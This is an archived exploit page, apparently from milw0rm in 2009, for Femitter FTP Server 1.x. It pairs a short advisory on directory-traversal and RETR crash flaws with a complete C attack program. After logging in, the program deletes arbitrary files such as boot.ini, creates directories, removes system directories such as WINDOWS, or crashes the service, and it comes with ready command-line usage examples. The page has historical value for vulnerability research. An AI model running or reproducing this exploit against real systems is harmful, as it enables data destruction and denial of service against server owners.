<html><head><title>Femitter FTP Server 1.x Multiple Vulnerabilities (post auth)</title></head><pre>/*
Femitter Server FTP 1.x Multiple Vulnerability
----------------------------------------------------

Arbitrary:
----------
The vulnerability is caused due to an input validation error when processing FTP requests. This can be 
exploited to read, modify, or delete arbitrary files from the affected system via directory traversal 
attacks.

Remote Crash:
-------------
The vulnerability is caused due to an error in handling the RETR command. This can be exploited to crash 
the FTP service by sending the &quot;RETR&quot; command without sending the &quot;PORT&quot; command.
--------------------------------------------------------------------------------------------------------

FTP Service:
------------
You can delet file boot.ini 	=&gt; DELE ../../boot.ini
You can get file boot.ini 	=&gt; RETR ../../boot.ini
You can creat Directory 	=&gt; MKD ../../poc
You can delet Directory		=&gt; RMD ../../WINDOWS
You can crash service 		=&gt; (RETR 0)x2


Author: Jonathan Salwan
Mail  : submit [AT] shell-storm.org
Web   : http://www.shell-storm.org
*/

#include &quot;stdio.h&quot;
#include &quot;unistd.h&quot;
#include &quot;stdlib.h&quot;
#include &quot;sys/types.h&quot;
#include &quot;sys/socket.h&quot;
#include &quot;netinet/in.h&quot;

int syntax(char *file)
	{
	fprintf(stderr,&quot;\nFemitter Server FTP 1.x Multiple Vulnerability\n&quot;);
	fprintf(stderr,&quot;-----------------------------------------------------\n&quot;);
	fprintf(stderr,&quot;=&gt;Syntax  : &lt;%s&gt; &lt;ip&gt; &lt;port&gt; &lt;login&gt; &lt;passwd&gt; &lt;option&gt; &lt;argument_option&gt;\n\n&quot;,file);
	fprintf(stdout,&quot;=&gt;Option  : -df\t\tDelet File\n&quot;);
	fprintf(stdout,&quot;            -cd\t\tCreat Directory\n&quot;);
	fprintf(stdout,&quot;            -dd\t\tDelet Directory\n&quot;);
	fprintf(stdout,&quot;            -crash\tRemote Crash with Request RETR\n\n&quot;);
	fprintf(stdout,&quot;=&gt;Exemple : %s 127.0.0.1 21 login1 passwd2 -df ../../boot.ini\n&quot;, file);
	fprintf(stdout,&quot;          : %s 127.0.0.1 21 login1 passwd2 -cd ../../poc\n&quot;, file);
	fprintf(stdout,&quot;          : %s 127.0.0.1 21 login1 passwd2 -dd ../../WINDOWS\n\n&quot;, file);
	fprintf(stdout,&quot;=&gt;Crash   : %s 127.0.0.1 21 anonymous aaaa -crash-ftp\n\n&quot;, file);
	exit(0);
	}

int main(int argc, char **argv)
{
	if (argc &lt; 6)
		syntax(argv[0]);
	
	int port = atoi(argv[2]);

	int mysocket;
	int mysocket2;
	int srv_connect;
	int sockaddr_long;


		struct sockaddr_in sockaddr_mysocket;
		sockaddr_long = sizeof(sockaddr_mysocket);
		sockaddr_mysocket.sin_family = AF_INET;
		sockaddr_mysocket.sin_addr.s_addr = inet_addr(argv[1]);
		sockaddr_mysocket.sin_port = htons(port);

        char request[50];
	char answer[100];

        fprintf(stdout,&quot;[+]Connect to Server %s\n&quot;,argv[1]);

                mysocket2 = socket(AF_INET, SOCK_STREAM, 0);
                        if(mysocket2 == -1){
                        fprintf(stderr,&quot;[-]FAILED SOCKET\n&quot;);
			return 1;}

	srv_connect = connect(mysocket2, (struct sockaddr*)&amp;sockaddr_mysocket, sockaddr_long);
		
	if (srv_connect != -1)
 		{	
			if(!strcmp(argv[5], &quot;-df&quot;)){
					sprintf(request, &quot;USER %s\r\n&quot;, argv[3]);		
						if (send(mysocket2,request,strlen(request),0) == -1){
							fprintf(stderr,&quot;[-]Send Request USER\t\t[FAILED]\n&quot;);
							shutdown(mysocket2,1);
							return 1;}
						else{
							memset(answer,0,100);
							recv(mysocket2,answer,sizeof(answer),0);
						 }
			sprintf(request, &quot;PASS %s\r\n&quot;, argv[4]);
				if (send(mysocket2,request,strlen(request),0) == -1){
				        fprintf(stderr,&quot;[-]Send Request PASS\t\t[FAILED]\n&quot;);
				        shutdown(mysocket2,1);
				        return 1;}
				else{ 
					memset(answer,0,100);
				        recv(mysocket2,answer,sizeof(answer),0);
				        fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
				 }
		sprintf(request, &quot;SYST\r\n&quot;);
		if (send(mysocket2,request,strlen(request),0) == -1){
		        fprintf(stderr,&quot;[-]Send Request PASS\t\t[FAILED]\n&quot;);
		        shutdown(mysocket2,1);
		        return 1;}
		else{
		        memset(answer,0,100);
		        recv(mysocket2,answer,sizeof(answer),0);
		        fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
		 }						
				sprintf(request, &quot;DELE %s\r\n&quot;, argv[6]);
					if (send(mysocket2,request,strlen(request),0) == -1){
						fprintf(stderr,&quot;[-]Send Request DELE\t\t[FAILED]\n&quot;);
						shutdown(mysocket2,1);
						return 1;}
					else{ 
						memset(answer,0,100);
						recv(mysocket2,answer,sizeof(answer),0);
						fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
					 }	
				}


			if(!strcmp(argv[5], &quot;-cd&quot;)){
					sprintf(request, &quot;USER %s\r\n&quot;, argv[3]);		
						if (send(mysocket2,request,strlen(request),0) == -1){
							fprintf(stderr,&quot;[-]Send Request USER\t\t[FAILED]\n&quot;);
							shutdown(mysocket2,1);
							return 1;}
						else{
							memset(answer,0,100);
							recv(mysocket2,answer,sizeof(answer),0);
						 }
			sprintf(request, &quot;PASS %s\r\n&quot;, argv[4]);
				if (send(mysocket2,request,strlen(request),0) == -1){
				        fprintf(stderr,&quot;[-]Send Request PASS\t\t[FAILED]\n&quot;);
				        shutdown(mysocket2,1);
				        return 1;}
				else{ 
					memset(answer,0,100);
				        recv(mysocket2,answer,sizeof(answer),0);
				        fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
				 }
		sprintf(request, &quot;SYST\r\n&quot;);
		if (send(mysocket2,request,strlen(request),0) == -1){
		        fprintf(stderr,&quot;[-]Send Request PASS\t\t[FAILED]\n&quot;);
		        shutdown(mysocket2,1);
		        return 1;}
		else{
		        memset(answer,0,100);
		        recv(mysocket2,answer,sizeof(answer),0);
		        fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
		 }
				sprintf(request, &quot;MKD %s\r\n&quot;, argv[6]);
					if (send(mysocket2,request,strlen(request),0) == -1){
						fprintf(stderr,&quot;[-]Send Request MKD\t\t[FAILED]\n&quot;);
						shutdown(mysocket2,1);
						return 1;}
					else{ 
						memset(answer,0,100);
						recv(mysocket2,answer,sizeof(answer),0);
						fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
					 }
			}


			if(!strcmp(argv[5], &quot;-dd&quot;)){
					sprintf(request, &quot;USER %s\r\n&quot;, argv[3]);		
						if (send(mysocket2,request,strlen(request),0) == -1){
							fprintf(stderr,&quot;[-]Send Request USER\t\t[FAILED]\n&quot;);
							shutdown(mysocket2,1);
							return 1;}
						else{
							memset(answer,0,100);
							recv(mysocket2,answer,sizeof(answer),0);
						 }
			sprintf(request, &quot;PASS %s\r\n&quot;, argv[4]);
				if (send(mysocket2,request,strlen(request),0) == -1){
				        fprintf(stderr,&quot;[-]Send Request PASS\t\t[FAILED]\n&quot;);
				        shutdown(mysocket2,1);
				        return 1;}
				else{ 
					memset(answer,0,100);
				        recv(mysocket2,answer,sizeof(answer),0);
				        fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
				 }
		sprintf(request, &quot;SYST\r\n&quot;);
		if (send(mysocket2,request,strlen(request),0) == -1){
		        fprintf(stderr,&quot;[-]Send Request PASS\t\t[FAILED]\n&quot;);
		        shutdown(mysocket2,1);
		        return 1;}
		else{
		        memset(answer,0,100);
		        recv(mysocket2,answer,sizeof(answer),0);
		        fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
		 }
				sprintf(request, &quot;RMD %s\r\n&quot;, argv[6]);
					if (send(mysocket2,request,strlen(request),0) == -1){
						fprintf(stderr,&quot;[-]Send Request RMD\t\t[FAILED]\n&quot;);
						shutdown(mysocket2,1);
						return 1;}
					else{ 
						memset(answer,0,100);
						recv(mysocket2,answer,sizeof(answer),0);
						fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
					 }
			}


			if(!strcmp(argv[5], &quot;-crash-ftp&quot;)){
					sprintf(request, &quot;USER %s\r\n&quot;, argv[3]);		
						if (send(mysocket2,request,strlen(request),0) == -1){
							fprintf(stderr,&quot;[-]Send Request USER\t\t[FAILED]\n&quot;);
							shutdown(mysocket2,1);
							return 1;}
						else{
							memset(answer,0,100);
							recv(mysocket2,answer,sizeof(answer),0);
						 }
			sprintf(request, &quot;PASS %s\r\n&quot;, argv[4]);
				if (send(mysocket2,request,strlen(request),0) == -1){
				        fprintf(stderr,&quot;[-]Send Request PASS\t\t[FAILED]\n&quot;);
				        shutdown(mysocket2,1);
				        return 1;}
				else{ 
					memset(answer,0,100);
				        recv(mysocket2,answer,sizeof(answer),0);
				        fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
				 }
		sprintf(request, &quot;SYST\r\n&quot;);
		if (send(mysocket2,request,strlen(request),0) == -1){
		        fprintf(stderr,&quot;[-]Send Request PASS\t\t[FAILED]\n&quot;);
		        shutdown(mysocket2,1);
		        return 1;}
		else{
		        memset(answer,0,100);
		        recv(mysocket2,answer,sizeof(answer),0);
		        fprintf(stdout,&quot;[+]&gt;&gt;%s&quot;,answer);
		 }
				sprintf(request, &quot;RETR O\r\nRETR 0\r\n&quot;);
					if (send(mysocket2,request,strlen(request),0) == -1){
						fprintf(stderr,&quot;[-]Send Request RETR\t\t[FAILED]\n&quot;);
						shutdown(mysocket2,1);
						return 1;}	 
				}
		}

	else{
		fprintf(stderr,&quot;[-]Connect\t\t[FAILED]\n&quot;);
		shutdown(mysocket2,1);
		return 1;}


	shutdown(mysocket2,1);


fprintf(stdout,&quot;[+]Done!\n&quot;, argv[5]);
return 0;
}

// milw0rm.com [2009-03-24]</pre></html>